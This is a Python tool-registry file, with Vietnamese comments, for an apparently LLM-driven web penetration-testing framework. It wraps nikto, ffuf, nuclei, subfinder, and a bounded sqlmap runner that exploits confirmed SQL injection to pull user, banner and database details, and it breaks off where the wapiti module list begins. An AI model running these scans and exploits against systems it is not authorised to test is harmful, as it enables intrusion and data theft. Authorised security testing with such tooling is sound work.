#!/usr/bin/env python3
"""
aixsec-x — tools.py
Tool registry cho web exploitation. Mỗi tool = JSON schema + executor.
Chỉ chạy lệnh đã được allowlist trong registry (không dispatch chuỗi lệnh tự do).
"""
from __future__ import annotations

import json
import hashlib
import os
import re
import shutil
import subprocess
import time
from dataclasses import dataclass, field


@dataclass
class ToolSpec:
    name: str
    description: str
    parameters: dict
    exec_fn: callable
    scope_params: tuple = ("host", "url", "target", "hostname")
    risk: str = "safe"          # safe | noisy | active | destructive
    output_filter: str = "text"

    def schema(self) -> dict:
        return {"type": "function", "function": {
            "name": self.name, "description": self.description, "parameters": self.parameters}}


# ─────────────────────────────────────────────
# EXEC HELPERS
# ─────────────────────────────────────────────

def run_cmd(argv: list, timeout: int = 90, max_chars: int = 5000) -> str:
    try:
        r = subprocess.run(argv, capture_output=True, text=True, timeout=timeout)
        out = (r.stdout or "").strip()
        err = (r.stderr or "").strip()
        combined = out + ("\n[stderr]\n" + err if err else "")
        combined = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", combined)
        combined = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]", "", combined)
        if not combined:
            return "(no output)"
        return combined[:max_chars] + (f"\n... [truncated at {max_chars}]" if len(combined) > max_chars else "")
    except subprocess.TimeoutExpired:
        return f"[!] Timeout sau {timeout}s."
    except FileNotFoundError:
        return f"[!] '{argv[0]}' chưa cài. Cài: sudo apt install {argv[0]}"
    except Exception as e:
        return f"[!] Lỗi: {e}"


def _need(tool: str):
    if shutil.which(tool) is None:
        hint = _MISSING_HINT.get(tool, "")
        raise FileNotFoundError(f"{tool} chưa cài trên máy này"
                                + (f" — {hint}" if hint else ""))


# Binary ngoài cần thiết cho từng tool — kiểm tra lúc khởi động để model KHÔNG
# lên kế hoạch quanh tool chết (vd nuclei/arjun thường không có trên Kali),
# tránh tốn round vào outcome=error rồi mới bị gate cứng (v1.4.2).
TOOL_BINS: dict[str, str] = {
    "nuclei_scan": "nuclei",
    "param_discovery": "arjun",
    "sqlmap_check": "sqlmap",
    "sqlmap_runner": "sqlmap",
    "nikto_scan": "nikto",
    "wapiti_scan": "wapiti",

    "ffuf_dir": "ffuf",
    "subdomain_enum": "subfinder",
    "detect_cms": "whatweb",
    "waf_detect": "wafw00f",
}

# Hint thay thế khi binary thiếu (model 9B hiểu nhanh hơn với hướng dẫn cụ thể)
_MISSING_HINT: dict[str, str] = {
    "nuclei": "Thay thế bằng ffuf_dir, nikto_scan, sqlmap_check/sqli_manual_test.",
    "arjun": "Thay thế bằng ffuf_dir hoặc kiểm tra tham số thủ công.",
    "sqlmap": "Sử dụng sqlmap_runner (bounded) để khai thác tự động; nếu không cài sqlmap thì dùng sqli_blind_extract (chậm hơn nhiều).",
}

# v1.4.3: trần timeout (giây) theo từng tool — chặn tool chạy quá lâu không tôn
# trọng _timeout tốt (live-run: arjun đốt 427s). _dispatch áp
# min(tool_timeout cấu hình, cap này). Tool không nằm trong dict dùng thẳng
# tool_timeout của operator.
# v1.4.4: nikto_scan 120→180s — 120s quá ngắn (live-run: kết quả rỗng vì bị
# run_cmd giết giữa chừng trước khi kịp in findings); _nikto_scan truyền
# -maxtime = _timeout-10 để nikto tự kết thúc đúng hạn.
TOOL_TIMEOUTS: dict[str, int] = {
    "api_discovery": 100,
    "param_discovery": 60,   # arjun -q có thể chạy rất lâu
    "detect_cms": 90,        # whatweb -a 3 chậm trên site lớn
    "subdomain_enum": 90,    # subfinder brute từ từ
    "nikto_scan": 180,       # nikto vốn chậm — cap đủ cho scan trung bình
    "sqlmap_runner": 300,   # v1.4.7: sqlmap bounded — đủ cho 1 lần chạy technique set
    "wapiti_scan": 600,      # hard cap mặc định; dispatcher cấp max_scan_time + 90s cleanup
    "crawler": 120,          # v1.9.1: BFS crawl GET-only (hint có method thật; UNKNOWN không ép GET; time_budget tự dừng)
}

# Tool quét dài được dispatcher cấp budget riêng. Wapiti dùng
# max_scan_time + 90 giây cho cleanup/report, tối đa 600 giây mặc định; operator
# có thể chủ động tăng WEBX_TOOL_TIMEOUT cho mục tiêu lớn.
LONG_RUN_TOOLS: frozenset = frozenset({"wapiti_scan"})


def available_tools(config=None) -> tuple[set, dict]:
    """(set tool khả dụng, dict {tool_name: binary thiếu}) — gọi 1 lần lúc khởi động.
    Chỉ các tool cần binary NGOÀI mới được liệt kê; tool thuần Python
    (http_probe, headers_recon, dns_lookup, sqli_manual_test, ...) luôn khả dụng."""
    # tool thuần Python (không cần binary ngoài) LUÔN khả dụng
    avail: set = {ts.name for ts in TOOL_REGISTRY if not TOOL_BINS.get(ts.name)}
    missing: dict = {}
    for name, binary in TOOL_BINS.items():
        if shutil.which(binary):
            avail.add(name)
        else:
            missing[name] = binary
    from adapters.nuclei import executable as nuclei_executable
    if nuclei_executable(config or {}):
        avail.add('nuclei_scan'); missing.pop('nuclei_scan', None)
    else:
        avail.discard('nuclei_scan')
        missing['nuclei_scan'] = (config or {}).get('nuclei_executable', 'nuclei')
    from adapters.zap import executable
    if not executable(config or {}):
        avail.difference_update({"zap_baseline", "zap_active_scan"})
    return avail, missing


# ─────────────────────────────────────────────
# CAPABILITY DISCOVERY (v1.6.0 — roadmap item #14)
# Planner chỉ được chọn tool có binary THẬT trên máy; version giúp model tránh
# flag không tồn tại (vd nikto cũ/new). Probe version là subprocess → LAZY:
# chỉ chạy khi user gọi /capabilities / --capabilities (hoặc force=True), cache
# toàn cục — KHÔNG chạy mỗi round / lúc khởi động (giữ test 229-case nhanh).
# ─────────────────────────────────────────────
_VERSION_FLAGS: dict[str, tuple] = {
    "nikto": ("-Version",),   # nikto không có --version
}
_DEFAULT_VERSION_FLAGS = ("--version", "-version", "-V")
_CAP_CACHE: list | None = None


def _version_string(binary: str) -> str:
    """Lấy version binary (thử flags theo thứ tự; timeout 4s/flag).
    Trả dòng đầu tiên (≤100 ký tự, phải chứa chữ số — tránh chuỗi lỗi như
    'usage: ...') hoặc '' nếu không lấy được. Không raise — capability chỉ là
    thông tin, KHÔNG chặn tool."""
    flags = _VERSION_FLAGS.get(binary, _DEFAULT_VERSION_FLAGS)
    for flag in flags:
        try:
            r = subprocess.run([binary, flag], capture_output=True, text=True,
                               timeout=4)
            if r.returncode not in (0, 1):
                continue
            out = (r.stdout or r.stderr or "").strip()
            line = out.splitlines()[0].strip() if out else ""
            if not line or len(line) > 100:
                line = line[:100] if line else ""
            if any(ch.isdigit() for ch in line):
                return line
        except (subprocess.TimeoutExpired, OSError, ValueError):
            continue
    return ""


def capability_report(force: bool = False) -> list[dict]:
    """Danh sách [{tool, binary, available, version}] theo TOOL_BINS, sort theo
    tool. Cache toàn cục — probe lại chỉ khi force=True. Tự động reset cache khi
    danh sách binary thay đổi (test/khởi động lại)."""
    global _CAP_CACHE
    if _CAP_CACHE is None or force:
        rows = []
        for name in sorted(TOOL_BINS):
            binary = TOOL_BINS[name]
            path = shutil.which(binary)
            rows.append({"tool": name, "binary": binary,
                         "available": path is not None,
                         "version": _version_string(binary) if path else ""})
        _CAP_CACHE = rows
    return _CAP_CACHE


def _url_host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).hostname or url


# ─────────────────────────────────────────────
# TOOLS — recon layer
# ─────────────────────────────────────────────

def _http_probe(**kw):
    url, timeout = kw["url"], kw["_timeout"]
    try:
        import http_engine as he
        import requests
        # v1.8.1: dùng Session Engine (cookie jar + UA mặc định khớp cũ) — bỏ
        # requests.get riêng; output/data giữ nguyên format v1.5.6/v1.7.0,
        # header giá trị nhạy cảm che <redacted> (giữ name để inventory dò được).
        resp, _rec = he.session_for(url).request(
            "get", url, timeout=min(timeout, 20))
        keys = ["Server", "X-Powered-By", "Content-Security-Policy", "X-Frame-Options",
                "X-XSS-Protection", "Strict-Transport-Security", "Set-Cookie", "Location",
                "WWW-Authenticate", "Content-Type"]
        h = he.redact_headers({k: v for k, v in resp.headers.items()
                               if k in keys or k.lower() in [x.lower() for x in keys]})
        body = re.sub(r"\s+", " ", (resp.text or "")[:600])
        # v1.7.0 (structured ToolResult): (output_text, data_dict) — inventory
        # đọc data trực tiếp (headers THẬT, không cần regex trên text).
        data = {"url": url, "method": "GET", "status": resp.status_code,
                "headers": he.redact_headers(
                    {k: v for k, v in resp.headers.items()})}
        return ((f"GET {url} → {resp.status_code} ({len(resp.content)} bytes)\n"
                 f"headers: {h}\nbody_snippet: {body}"), data)
    except ImportError:
        return run_cmd(["curl", "-sS", "-i", "--max-time", "20", url], timeout), None
    except requests.exceptions.ConnectionError as e:
        return f"[!] Không kết nối được: {e}", None
    except requests.exceptions.Timeout:
        return "[!] Timeout HTTP", None


def _http_request(**kw):
    """v1.8.0: ADAPTER trên HTTP Session Engine (http_engine.py) — giữ NGUYÊN
    interface + output format v1.5.6. Session Engine đảm nhiệm cookie jar theo
    host, query params, form/JSON/multipart/raw body, basic/bearer/API-key auth,
    redirect history, timing, evidence, replay, proxy.
    AI → http_request tool → Session Engine → requests.Session.
    Bounded: timeout ≤30s (mặc định 5, được kẹp 5..30), body snippet ≤2000 ký tự."""
    import http_engine as he
    import requests
    url = kw["url"]
    method = str(kw.get("method") or "get").lower().strip()
    if method not in he.METHODS:
        return (f"[!] http_request: method phải là {'|'.join(he.METHODS)} "
                f"(nhận '{method}').")
    follow = bool(kw.get("follow_redirects", True))
    timeout = min(max(5, int(kw.get("_timeout") or 30)), 30)
    try:
        sess = he.session_for(url)
        resp, rec = sess.request(
            method, url,
            headers=dict(kw.get("headers") or {}),
            params=dict(kw.get("params") or {}),
            body=kw.get("body"), data=kw.get("data"),
            json_body=kw.get("json_body"), form=kw.get("form"),
            files=kw.get("files"),
            auth=kw.get("auth"),
            cookies=dict(kw.get("cookies") or {}),
            follow_redirects=follow, timeout=timeout)
        # v1.8.1: headers/cookies trong out lẫn data đều redact (che giá trị
        # nhạy cảm, giữ name) — inventory vẫn dò được cấu trúc, log không lộ secret.
        hdrs = he.redact_headers({k: v for k, v in resp.headers.items()})
        body_snip = resp.body_snippet
        dt = round(resp.elapsed or rec.elapsed, 2)
        # v1.8.0: data bổ sung final_url/history/cookies/evidence (bounded) —
        # inventory + finding evidence đọc trực tiếp, không regex.
        data = {"url": url, "method": resp.method, "status": resp.status_code,
                "headers": hdrs, "body_snippet": body_snip,
                "final_url": resp.url or url, "elapsed": dt,
                "history": [{"status": h["status"], "url": h["url"]}
                             for h in resp.history],
                "cookies": he.redact_cookies(resp.cookies or {}),
                "evidence": rec.evidence_dict()}
        if any('json' in str(v).lower() for k, v in resp.headers.items() if k.lower() == 'content-type') and len(resp.content) <= 2_000_000:
            from api_discovery import infer_schema
            try:
                data['response_schema'] = infer_schema(json.loads(resp.text))
            except (ValueError, RecursionError):
                pass
        out = (f"{resp.method} {url} → {resp.status_code} "
               f"({len(resp.content)} bytes, {dt}s)\n"
               f"headers:\n" + "\n".join(f"  {k}: {v}" for k, v in hdrs.items()))
        if resp.history:
            chain = " → ".join(str(h["status"]) for h in resp.history)
            out += f"\nredirects: {chain} → {resp.status_code}"
        out += f"\nbody_snippet:\n{body_snip}"
        return out, data
    except requests.exceptions.ConnectionError as e:
        return f"[!] http_request: không kết nối được: {e}", None
    except requests.exceptions.Timeout:
        return "[!] http_request: timeout HTTP", None
    except requests.exceptions.RequestException as e:
        return f"[!] http_request: lỗi request: {e}", None
    except ValueError as e:
        return f"[!] http_request: {e}", None


def _crawl(**kw):
    """v1.9.0: BFS crawl GET-only qua CHUNG Session Engine (http_engine.
    session_for) — khám phá link/form/param/script/js-hint; không submit form,
    không chạy exploit. record=False: traffic crawl KHÔNG vào ring buffer
    evidence (replay/PoC giữ cho http_request).
    time_budget = max(5, _timeout-5): crawler TỰ dừng đúng hạn (Python tool
    không bị kill ngoài); cap TOOL_TIMEOUTS["crawler"]=120s qua _dispatch."""
    import crawler  # lazy — tránh import nặng nếu session không dùng tool này
    url = kw["url"]
    timeout = int(kw.get("_timeout") or 90)
    try:
        result = crawler.crawl(
            url,
            # KHÔNG dùng `x or 3`: max_depth=0/max_pages nhỏ là giá trị HỢP LỆ
            # (test/hộp thoại) — chỉ default khi tham số VẮNG MẶT.
            max_depth=int(kw["max_depth"]) if kw.get("max_depth") is not None else 3,
            max_pages=int(kw["max_pages"]) if kw.get("max_pages") is not None else 100,
            same_scope=bool(kw.get("same_scope", True)),
            timeout=float(kw.get("request_timeout") or 30),
            time_budget=max(5, timeout - 5))
        return result.render(), result.to_data()
    except ValueError as e:
        return f"[!] crawler: {e}", None


def _api_discovery(**kw):
    from api_discovery import discover
    try:
        result = discover(kw['url'], max_requests=int(kw.get('max_requests', 24)),
                          time_budget=min(90, max(1, int(kw.get('_timeout', 95)) - 5)))
        return f"API discovery: {len(result['operations'])} operation observations; {len(result['warnings'])} warnings", result
    except (ValueError, TypeError) as exc:
        return f"[!] api_discovery: {exc}", None


def _api_import(**kw):
    from api_discovery import import_document
    try:
        result = import_document(kw['document'], kw['url'])
        return f"API import: {len(result['operations'])} declared operations; {len(result['warnings'])} warnings", result
    except (ValueError, TypeError, AttributeError, RecursionError):
        return "[!] api_import: invalid or unsupported document", None


def _auth_context_set(**kw):
    import auth_context
    try:
        data = auth_context.manager().configure(
            kw["name"], kw["origin"], transport=kw.get("transport"),
            login_steps=kw.get("login_steps"), logout_step=kw.get("logout_step"),
            replace=bool(kw.get("replace", False)))
        return f"Auth context {data['name']}: {data['state']}", data
    except (ValueError, TypeError) as exc:
        return f"[!] auth_context_set: {exc}", None


def _auth_context_list(**kw):
    import auth_context
    data = {"contexts": auth_context.manager().list()}
    return f"Auth contexts: {len(data['contexts'])}", data


def _auth_login(**kw):
    import auth_context
    try:
        data = auth_context.manager().get(kw["name"]).login()
        return f"Auth login {kw['name']}: {data['state']}", data
    except (ValueError, TypeError, json.JSONDecodeError) as exc:
        return f"[!] auth_login: {exc}", None


def _auth_logout(**kw):
    import auth_context
    try:
        data = auth_context.manager().get(kw["name"]).logout()
        return f"Auth logout {kw['name']}: {data['state']}", data
    except (ValueError, TypeError) as exc:
        return f"[!] auth_logout: {exc}", None


def _auth_context_remove(**kw):
    import auth_context
    removed = auth_context.manager().remove(kw["name"])
    data = {"name": kw["name"], "removed": removed}
    return f"Auth context {kw['name']}: {'removed' if removed else 'not found'}", data


def _auth_compare(**kw):
    import auth_context
    try:
        request = dict(kw["request"])
        data = auth_context.manager().compare(list(kw["contexts"]), request)
        changed = sum(not pair["same_body_hash"] for pair in data["comparisons"])
        return (f"Auth comparison: {len(data['observations'])} contexts, "
                f"{changed}/{len(data['comparisons'])} body pairs differ; facts only"), data
    except (ValueError, TypeError, json.JSONDecodeError) as exc:
        return f"[!] auth_compare: {exc}", None


def _dynamic_plan(**kw):
    import security_analysis
    try:
        data = security_analysis.manager().plan(
            kw.get("goal") or "coverage", int(kw.get("max_actions", 12)))
        return (f"Dynamic plan {data['plan_id']}: {len(data['actions'])} actions "
                f"({data['counts']['planned']} planned, {data['counts']['blocked']} blocked, "
                f"{data['counts']['completed']} completed)"), data
    except (ValueError, TypeError) as exc:
        return f"[!] dynamic_plan: {exc}", None


def _authorization_reason(**kw):
    import security_analysis
    try:
        data = security_analysis.manager().reason_authorization(
            kw.get("url") or "", kw.get("resource_owner") or "",
            kw.get("expected_allowed_contexts") or [])
        return f"Authorization reasoning: {len(data['hypotheses'])} hypotheses; no verdicts", data
    except (ValueError, TypeError) as exc:
        return f"[!] authorization_reason: {exc}", None


def _business_rule_set(**kw):
    import security_analysis
    try:
        data = security_analysis.manager().set_rule(kw["workflow"], kw["rule"])
        return f"Business rule {data['rule_id']} configured", data
    except (ValueError, TypeError) as exc:
        return f"[!] business_rule_set: {exc}", None


def _business_workflow_test(**kw):
    import security_analysis
    try:
        data = security_analysis.manager().execute_workflow(
            kw["workflow"], kw["context"], kw["steps"])
        return f"Workflow run {data['run_id']}: {len(data['observations'])} observed steps", data
    except (ValueError, TypeError) as exc:
        return f"[!] business_workflow_test: {exc}", None


def _business_reason(**kw):
    import security_analysis
    try:
        data = security_analysis.manager().reason_business(kw["workflow"])
        return f"Business reasoning: {len(data['hypotheses'])} hypotheses; no verdicts", data
    except (ValueError, TypeError) as exc:
        return f"[!] business_reason: {exc}", None


def _sast_dast_correlate(**kw):
    import security_analysis
    try:
        data = security_analysis.manager().correlate(int(kw.get("max_results", 30)))
        return (f"SAST→DAST: {len(data['correlations'])} candidate correlations from "
                f"{data['sast_findings']} SAST findings; no verdicts"), data
    except (ValueError, TypeError) as exc:
        return f"[!] sast_dast_correlate: {exc}", None


def _phase3_status(**kw):
    import security_analysis
    data = security_analysis.manager().status()
    return (f"Phase 3 state: rules={data['rules']}, runs={data['workflow_runs']}, "
            f"SAST findings={data['sast_findings']}"), data


def _dns_lookup(**kw):
    host = kw["host"]
    try:
        import socket
        ips = sorted({i[4][0] for i in socket.getaddrinfo(host, None)})
        return f"A records: {', '.join(ips)}" if ips else "(không phân giải được)"
    except Exception as e:
        return f"[!] DNS lỗi: {e}"


def _headers_recon(**kw):
    url = kw["url"]
    try:
        import http_engine as he
        import requests
        # v1.8.1: dùng Session Engine (HEAD qua cookie jar, UA như cũ) — bỏ
        # requests.head riêng; header nhạy cảm che <redacted> trong out lẫn data.
        resp, _rec = he.session_for(url).request(
            "head", url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
        hdrs = he.redact_headers({k: v for k, v in resp.headers.items()})
        # v1.7.0 (structured ToolResult): data = headers THẬT (đã redact value)
        data = {"url": url, "method": "HEAD", "status": resp.status_code,
                "headers": hdrs}
        return ("HEAD " + url + f" → {resp.status_code}\n" + "\n".join(
            f"{k}: {v}" for k, v in hdrs.items()), data)
    except Exception as e:
        return f"[!] {e}", None


def _waf_detect(**kw):
    _need("wafw00f")
    return run_cmd(["wafw00f", kw["url"], "-o", "-"], kw["_timeout"])


def _detect_cms(**kw):
    _need("whatweb")
    return run_cmd(["whatweb", "-a", "3", kw["url"]], kw["_timeout"])


def _subdomain_enum(**kw):
    _need("subfinder")
    return run_cmd(["subfinder", "-d", kw["domain"], "-silent"], kw["_timeout"])


def _nikto_scan(**kw):
    """Quét nikto — v1.4.4: -maxtime suy từ _timeout (cap 180s → -maxtime 170)
    để nikto TỰ KẾT THÚC trước khi run_cmd cắt (trước đây hardcode 120s: bị
    giết giữa chừng → output rỗng → model không có dữ liệu)."""
    _need("nikto")
    tmax = max(30, int(kw.get("_timeout") or 90) - 10)
    return run_cmd(["nikto", "-h", kw["url"], "-nointeractive",
                    "-maxtime", str(tmax)], kw["_timeout"])


# ─────────────────────────────────────────────
# TOOLS — active exploitation layer
# ─────────────────────────────────────────────

def _sql_error_verify(**kw):
    from verification import paired
    if not kw.get('_verification_entry') or not kw.get('_verification_record'):
        raise ValueError('Verification requires an executor-selected captured request and candidate')
    return paired(kw['_config'], kw['_verification_entry'], kw['parameter'],
                  kw['_verification_record'], kw.get('_timeout',60))


def _nuclei_scan(**kw):
    if kw.get('_config') is not None:
        from adapters.nuclei import run_scan
        return run_scan(kw['_config'], kw['url'], kw.get('_templates') or [], kw.get('_timeout'),
                        entry=kw.get('_entry'), auth_context=kw.get('auth_context','anonymous'))
    _need("nuclei")
    args = ["nuclei", "-u", kw["url"], "-silent"]
    if kw.get("severity"):
        args += ["-severity", kw["severity"]]
    if kw.get("tags"):
        args += ["-tags", kw["tags"]]
    args += ["-timeout", "10", "-c", "10"]
    return run_cmd(args, kw["_timeout"])


# ── v1.4: wordlist resolver ──
# Model nhỏ (9B) hay truyền tên ngắn gọn: "common", "common.txt",
# "SecLists/common-words.txt", "top500", "raft-medium"... thay vì đường dẫn đầy
# đủ. Resolver này map alias/basename → đường dẫn tuyệt đối trong SecLists.
SECLISTS_WEB = "/usr/share/seclists/Discovery/Web-Content"

# alias của wordlist directory-fuzz phổ biến → tên file TRONG Seclists
# (không trỏ ra ngoài: top500/lowercase… vốn là wordlist dirsearch, không nằm
# trong gói seclists — fallback về common.txt cho nhỏ/gọn)
_WL_ALIASES = {
    "common": "common.txt",
    "common.txt": "common.txt",
    "seclists/common-words.txt": "common.txt",
    "common-words.txt": "common.txt",
    "top500": "common.txt",
    "top500.txt": "common.txt",
    "raft": "raft-medium-directories.txt",
    "raft-medium": "raft-medium-directories.txt",
    "raft-medium-words": "raft-medium-words.txt",
    "raft-small": "raft-small-directories.txt",
    "raft-small-words": "raft-small-words.txt",
    "raft-large": "raft-large-directories.txt",
    "directory-list": "DirBuster-2007_directory-list-2.3-medium.txt",
    "dirbuster": "DirBuster-2007_directory-list-2.3-medium.txt",
    "dirbuster-medium": "DirBuster-2007_directory-list-2.3-medium.txt",
    "dirbuster-big": "DirBuster-2007_directory-list-2.3-big.txt",
    "dirbuster-small": "DirBuster-2007_directory-list-2.3-small.txt",
    "big": "big.txt",
    "big.txt": "big.txt",
    "combined": "combined_words.txt",
}

_WL_EXTRA_DIRS = [SECLISTS_WEB, SECLISTS_WEB + "/raft-medium-directories",
                  SECLISTS_WEB + "/raft-small-directories",
                  SECLISTS_WEB + "/CMS", SECLISTS_WEB + "/Web-Servers",
                  "/usr/share/wordlists/ffuf",  # wordlist riêng của ffuf
                  "/usr/share/wordlists/dirb",
                  "/usr/share/wordlists",
                  "/usr/share/dirb/wordlists"]


# fmt: off
def resolve_wordlist(wl: str = "", base_dir: str = None) -> str:
    """Map chuỗi wordlist (alias/basename/đường dẫn) → file tồn tại.

    Thứ tự: đường dẫn tuyệt đối (tồn tại) → alias (common→common.txt) →
    basename tìm trong base_dir/thư mục con → tìm theo đuôi đường dẫn
    ("SecLists/common-words.txt" → common.txt).
    Không tìm thấy → raise ValueError kèm gợi ý thư mục (để model sửa ngay,
    không đốt 120s rồi mới error làm hỏng URL-gate như v1.3).
    """
    if base_dir is None:
        # đánh giá tại call-time để test patch được SECLISTS_WEB
        base_dir = SECLISTS_WEB
    if not wl:
        wl = "common.txt"
    wl = wl.strip()
    if os.path.isabs(wl):
        if os.path.exists(wl):
            return wl
        raise ValueError(f"Wordlist không tồn tại: {wl}")
    if wl in _WL_ALIASES:
        cand = os.path.join(base_dir, _WL_ALIASES[wl])
        if os.path.exists(cand):
            return cand
    elif "\\" in wl or wl.lower() in _WL_ALIASES:
        # tên có dạng "Seclists/common-words.txt" (sai hoa/thường) — so khớp thường hóa
        norm = wl.replace("\\", "/").lower()
        for k, v in _WL_ALIASES.items():
            if norm == k.replace("\\", "/").lower() or norm.endswith("/" + v):
                cand = os.path.join(base_dir, v)
                if os.path.exists(cand):
                    return cand
    # basename trực tiếp trong base_dir
    cand = os.path.join(base_dir, wl)
    if os.path.exists(cand) and os.path.isfile(cand):
        return cand
    # tìm đệ quy theo basename trong các thư mục con phổ biến
    for d in _WL_EXTRA_DIRS:
        if not os.path.isdir(d):
            continue
        p = os.path.join(d, wl)
        if os.path.exists(p) and os.path.isfile(p):
            return p
        for root, _, files in os.walk(d):
            if wl.lower() in (f.lower() for f in files):
                return os.path.join(root, wl)
    # model hay truyền đường dẫn thiếu phần đầu (vd "SecLists/common-words.txt",
    # "raft-medium-directories/2.3medium.txt") — so trùng basename cuối cùng
    tail = wl.rstrip("./").replace("\\", "/")
    for part in reversed(tail.split("/")):
        if not part:
            continue
        for root, dirs, files in os.walk(SECLISTS_WEB):
            dirs[:] = [d for d in dirs if not d.startswith(".")]
            if part.lower() in (f.lower() for f in files):
                return os.path.join(root, part)
        break  # chỉ thử basename cuối, không lan sang segment giữa
    raise ValueError(
        f"Wordlist '{wl}' không tìm thấy. Đường dẫn hợp lệ nằm trong: "
        f"\n  - {base_dir}/ "
        f"\n  - {SECLISTS_WEB}/raft-medium-directories/ ..."
        f"\nAlias hỗ trợ: common, big, top500, raft, raft-medium, "
        f"dirbuster-*, directory-list-2.3-*"
        f"\nVí dụ đúng: wordlist='common.txt' hoặc "
        f"'raft-medium-directories/2.3medium.txt' hoặc "
        f"đường dẫn tuyệt đối tùy ý")
# fmt: on


def _ffuf_dir(**kw):
    _need("ffuf")
    try:
        wl = resolve_wordlist(kw.get("wordlist", ""))
    except ValueError as e:
        # lỗi rõ ràng kèm gợi ý — outcome=error nhưng model biết phải sửa gì;
        # tránh URL-gate nuốt hết ffuf_dir chỉ vì đường dẫn sai
        raise ValueError(str(e))
    args = ["ffuf", "-u", kw["url"].rstrip("/") + "/FUZZ",
            "-w", wl, "-mc", "200,204,301,302,307,401,403", "-t", str(kw.get("_threads", 30)),
            "-rate", str(kw.get("_rate", 0)),
            "-timeout", "10", "-maxtime", str(int(kw.get("maxtime") or 90)),
            "-s"]
    if kw.get("extensions"):
        args += ["-e", kw["extensions"]]
    return run_cmd(args, kw["_timeout"])


def _sqlmap_check(**kw):
    _need("sqlmap")
    args = ["sqlmap", "-u", kw["url"]]
    if kw.get("data"):
        args += ["--data", kw["data"]]
    args += ["--batch", "--level", "1", "--risk", "1", "--smart",
            "--current-user", "--banner"]
    return run_cmd(args, kw["_timeout"])


# v1.4.7: sqlmap BOUNDED — pipeline khai thác gọi tool này FIRST sau CONFIRMED
# (thay vì sqli_blind_extract chậm). Khác sqlmap_check ở chỗ có kỷ luật tham số:
# không --smart (nó bỏ qua nhiều payload), không --current-user/--banner chạy
# trước confirm; ép --technique / --level 1 / --risk 1 / --threads 1 / timeout
# ngắn / retries 1 — chặn sqlmap lang thang hàng trăm request.
_SQLMAP_TECH = set("BEUSTQ")  # B=Boolean E=Error U=Union S=Stacked T=Time Q=inline


def _sqlmap_runner(**kw):
    """Chạy sqlmap bị chặn kỷ luật (bounded) — GỌI SAU KHI SQLi CONFIRMED.

    Output là log sqlmap đã cắt; marker "is vulnerable"/"Parameter:"/"back-end
    DBMS:"/"current database:" là dấu hiệu khai thác thành công. Nếu sqlmap
    không ra dấu hiệu (vd template CONTAINS hấp thụ payload) → model ghi nhận
    và hạ cấp kỳ vọng / chuyển manual, KHÔNG spam lại cùng url (bị blocked).
    """
    if kw.get('_verification_entry'):
        from verification import sqlmap_probe
        return sqlmap_probe(kw['_config'], kw['_verification_entry'], kw['parameter'], kw.get('_timeout',240))
    _need("sqlmap")
    url = kw["url"]
    # technique: allowlist B/E/U/S/T/Q, dedupe, giữ thứ tự (dict.fromkeys)
    tech_s = "".join(dict.fromkeys(c.upper() for c in str(kw.get("technique") or "BEUSTQ") if c.isalpha()))
    if not tech_s or not set(tech_s) <= _SQLMAP_TECH:
        return ("[!] sqlmap_runner: technique không hợp lệ — chỉ tổ hợp của "
                "B/E/U/S/T/Q (vd 'BE', 'T', 'E'); nhận: " + repr(kw.get("technique")))
    dbms = str(kw.get("dbms") or "auto").strip().lower()
    if dbms not in ("mssql", "mysql", "auto"):
        return f"[!] sqlmap_runner: dbms không hợp lệ — mssql|mysql|auto; nhận: {dbms!r}"
    secs = int(kw.get("timeout") or 240)
    secs = max(30, min(secs, 600))  # clamp 30..600 (mặc định 240)
    args = ["sqlmap", "-u", url, "--batch", "--technique", tech_s,
            "--level", "1", "--risk", "1", "--threads", "1",
            "--timeout", "15", "--retries", "1", "--flush-session"]
    if dbms != "auto":
        args += ["--dbms", dbms]
    if kw.get("data"):
        args += ["--data", kw["data"]]
    if kw.get("cookie"):
        args += ["--cookie", kw["cookie"]]
    out = run_cmd(args, min(secs, int(kw.get("_timeout") or secs)), max_chars=4000)
    # v1.4.9: run_cmd trả "[!] ..." = LỖI THỰC THI (timeout, thiếu binary, lỗi
    # khác) — KHÔNG phải "sqlmap chạy xong". Trước v1.4.9 timeout rơi vào nhánh
    # "KHÔNG thấy dấu hiệu" với outcome=ok → model tưởng "not injectable" và bịa
    # chi tiết (vd "lỗi 500") — SAI thiết kế. Lưu ý: sqlmap in "[!] legal
    # disclaimer" MỖI lần chạy → loại trừ dòng đó. Timeout/exec-lỗi → outcome=error.
    if out.startswith("[!]") and not out.startswith("[!] legal disclaimer"):
        err_line = out.splitlines()[0].lstrip("[!] ").strip()
        return ("[!] sqlmap không hoàn tất (lỗi thực thi): " + err_line
                + "\n[i] lệnh: " + " ".join(args)
                + "\n[i] KHÔNG kết luận injectable/not-injectable từ lần chạy này."
                  " Nếu timeout: giảm kỹ thuật (vd technique='E' hoặc 'T') hoặc"
                  " tăng timeout — KHÔNG gọi lại đúng url+tham số y hệt (bị block)")
    markers = ["is vulnerable", "Parameter:", "back-end DBMS:",
               "current database:", "current user:", "Table:"]
    low = out.lower()
    hits = [m for m in markers if m.lower() in low]
    pretty = " ".join(args)
    if hits or "no parameter(s) found for testing" not in out:
        if hits:
            head = f"[✓] sqlmap XÁC NHẬN khai thác — dấu hiệu: {', '.join(hits)}"
        else:
            head = "[-] sqlmap chạy xong KHÔNG thấy dấu hiệu khai thác."
    else:
        head = "[-] sqlmap không thấy tham số để test (xem log)."
    # v1.4.9: chuẩn hóa dòng "not injectable" — model đọc dòng này thay vì tự
    # diễn giải log trần (chống bịa số liệu như "218 lần lỗi 500").
    if "not injectable" in low or "not appear to be injectable" in low:
        head += (f"\n[i] sqlmap 'not injectable' với kỹ thuật {tech_s} — đúng cho kênh"
                 " này (template hấp thụ payload / WAF / không có kênh dữ liệu)."
                 " KHÔNG phải bằng chứng 'không có SQLi'; nếu đã CONFIRMED bằng"
                 " chứng cứ khác thì giữ candidate + NEEDS VALIDATION.")
    return f"{head}\n[i] lệnh: {pretty}\n" + out



# TOOLS — WAPITI (v1.5.0): crawler + TOÀN BỘ attack modules
# ─────────────────────────────────────────────
# wapiti 3.2.10 (`wapiti --list-modules`): 29 module. Khi KHÔNG truyền -m,
# wapiti chỉ chạy module "(used by default)" (9 module) — để support "toàn bộ
# loại tấn công wapiti hỗ trợ" (yêu cầu user) phải truyền -m với TOÀN BỘ danh
# sách dưới đây. Danh sách lấy từ `wapiti --list-modules` thật (không đoán).
_WAPITI_MODULES: tuple[str, ...] = (
